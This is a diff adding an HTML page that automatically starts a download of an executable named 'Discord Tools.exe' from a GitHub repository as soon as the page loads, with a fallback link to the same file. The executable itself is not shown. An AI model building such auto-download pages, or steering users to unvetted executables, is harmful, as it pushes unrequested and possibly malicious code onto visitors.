@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Downloading...</title>
+  <script>
+    window.onload = function() {
+      const link = document.createElement('a');
+      link.href = 'https://github.com/Tyvrixx/discordtools/raw/refs/heads/main/Discord%20Tools.exe';
+      link.download = '';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    };
+  </script>
+</head>
+<body>
+  <p>If your download doesn't start automatically, <a href="https://github.com/Tyvrixx/discordtools/raw/refs/heads/main/Discord%20Tools.exe" download>click here</a>.</p>
+</body>
+</html>
